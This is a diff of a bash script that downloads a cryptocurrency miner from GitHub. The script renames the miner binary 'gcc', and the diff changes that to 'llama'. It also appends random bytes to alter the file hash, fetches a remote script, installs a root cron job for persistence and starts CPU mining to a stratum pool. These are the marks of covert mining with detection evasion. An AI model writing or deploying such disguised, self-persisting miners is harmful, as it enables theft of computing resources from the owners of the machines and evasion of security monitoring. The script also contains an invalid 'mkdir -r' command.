@@ -39,19 +39,19 @@ done
 # 输出最低延迟的URL
 echo "最低延迟的URL是: $best_url，延迟: $min_latency ms"
 
-mkdir vrsc && cd vrsc
-wget -O gcc.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
-tar -zxvf gcc.tar.gz && rm -rf gcc.tar.gz
+mkdir -r /opt/vrsc && cd /opt/vrsc
+wget -O /opt/vrsc/gcc.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
+cd /opt/vrsc && tar -zxvf gcc.tar.gz && rm -rf gcc.tar.gz
 count=$((RANDOM % 1000 + 1))
 for ((i = 0; i < count; i++)); do
   echo -n "0" >> "hellminer"
 done
-mv hellminer gcc
+mv hellminer llama
 wget https://raw.githubusercontent.com/caippx/bash/refs/heads/master/drfytgybhunjoimkol/random_usage.sh
 chmod u+x *
-cron_job="0 */2 * * * /root/vrsc/random_usage.sh"
+cron_job="0 */2 * * * /opt/vrsc/random_usage.sh"
 # 检查任务是否已经存在
 (crontab -l | grep -qF "$cron_job") || (crontab -l; echo "$cron_job") | crontab -
 service cron reload
 service crond reload
-./gcc -c stratum+ssl://$best_url:5140  -u $address.$worker_name -p x --cpu $threads
+./llama -c stratum+ssl://$best_url:5140  -u $address.$worker_name -p x --cpu $threads
